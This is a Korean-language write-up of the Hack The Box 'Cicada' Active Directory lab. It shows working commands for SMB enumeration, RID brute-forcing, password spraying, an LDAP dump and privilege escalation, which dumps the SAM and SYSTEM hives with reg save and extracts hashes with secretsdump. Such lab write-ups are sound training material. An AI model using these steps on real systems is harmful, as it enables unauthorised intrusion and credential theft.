# HTB-CICADA
```bash
OS: Windows(AD)
DATE: 26.09.08
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 접근을 위해 전체 포트 검사와 상세 검사를 진행했다.
```bash
nmap -p- -T4 IP
nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269,5985 IP | tee nmap
```
포트 검사 결과 88(Kerberos), LDAP 등이 있는 것으로 보아 DC 서버인 것을 알 수 있었고, 도메인이 `cicada.htb`라는 것도 알게 되었다.

## Initial Access
초기 접근으로 nxc를 사용하여 익명으로 SMB 서비스를 시도해보았다.
```bash
nxc smb cicada.htb -u '' -p '' --shares
```
하지만 익명으로는 불가능하다는 것을 알게 되었고 많은 것을 시도해보았다. 이번엔 smbclient를 이용하여 `/HR` 디렉토리에 들어갈 수 있다는 것을 알게 되었다.
```bash
smbclient -L //cicada.htb -N
smbclient //cicada.htb/HR -N
```
그 디렉토리 안에는 `'Notice from HR.txt'`라는 파일이 있었고, 다운로드하여 확인해본 결과 기본 크리덴셜과 패스워드를 알 수 있게 되었다.
```txt
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
따라서 유저명들을 알아야 password spray를 시도할 수 있어, nxc를 사용하여 익명으로 `--users`, `--rid-brute` 등 많은 것을 시도해보았지만 나오지 않았다. 하지만 알고 보니 유저명을 입력하는 옵션에 아무거나 넣어야 작동하는 것을 알게 되어 rid-brute를 다시 시도했다.
```bash
nxc smb cicada.htb -u ajskl -p '' --rid-brute
```
따라서 많은 유저명을 알게 되었고, 바로 얻은 password와 함께 bruteforce를 시도했다.
```bash
nxc smb cicada.htb -u USERS -p 'PASS'
```
이를 통해 michael.wrightson이라는 유저 계정을 얻을 수 있었고, 쉘을 얻기 위해 WinRM, RDP, psexec 등을 시도했지만 쉘 접근이 불가능한 계정이었다. 따라서 AS-REP Roasting 등 많은 공격들을 시도했지만 불가능했고, `ldapdomaindump`라는 AD의 LDAP 서비스에 인증된 계정으로 도메인 전체를 덤프하는 도구를 사용하여 `domain_users.json`이라는 파일을 얻을 수 있었다. `jq .`를 사용하여 정렬하고 분석해본 결과, `david.orelious`라는 유저의 기본 크리덴셜을 얻을 수 있었다.
```bash
ldapdomaindump -u 'DOMAIN/USER' -p 'PASS' DC_IP
```
```bash
cat domain_users.json | jq .
```
이후 다시 한번 쉘 접속을 시도했지만 불가능했고, 기존 계정으로는 접속이 불가능했던 SMB DEV 폴더에 접속할 수 있었다. `Backup_script.ps1` 파일을 얻어보니, 이번에도 `emily.oscars`라는 유저의 크리덴셜이 하드코딩되어 있었다. 해당 계정은 WinRM 접근이 가능하여 처음으로 유저 쉘을 얻을 수 있었다.
![user](attach_real/Pasted%20image%2020260909191720.png)

## Privilege Escalation
쉘을 얻은 후 `whoami /all` 명령을 통해 권한 상승에 활용할 수 있는 권한들을 확인해본 결과, `Backup Operators` 그룹과 `SeBackupPrivilege` 권한이 있었다. 해당 권한은 백업 권한을 악용해 접근 통제를 우회하는 권한 상승 취약점이 있다.

- **권한상승 원리**: 정상적인 백업 소프트웨어는 파일 권한과 상관없이 모든 파일을 읽을 수 있어야 한다. 그래서 Windows는 Backup Operators 그룹에 SeBackupPrivilege를 부여하는데, 이 권한이 켜져 있으면 파일의 ACL을 무시하고 어떤 파일이든 읽을 수 있다. 따라서 원래 관리자만 접근 가능한 SAM/SYSTEM 레지스트리 하이브도 백업 목적이라는 명분하에 이 권한으로 복사가 가능하다.

따라서 SAM/SYSTEM 파일을 내 컴퓨터로 옮기고 `secretsdump.py` 도구로 Administrator NTLM hash를 얻을 수 있었다.
```cmd
reg save hklm\sam c:\Windows\Tasks\SAM
reg save hklm\system c:\Windows\Tasks\SYSTEM
```
```cmd
download c:\Windows\Tasks\SAM
download c:\Windows\Tasks\SYSTEM
```
```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```
이후 Admin NTLM hash를 얻어 시스템 권한 상승에 성공할 수 있었다.
![root](attach_real/Pasted%20image%2020260909194044.png)

## New Inform
- nxc 익명 접근을 시도할 때 -u 옵션에 아무거나 넣어야 한다.
- whoami /all을 항상 확인하고 취약한 권한이 있는지 확인한다.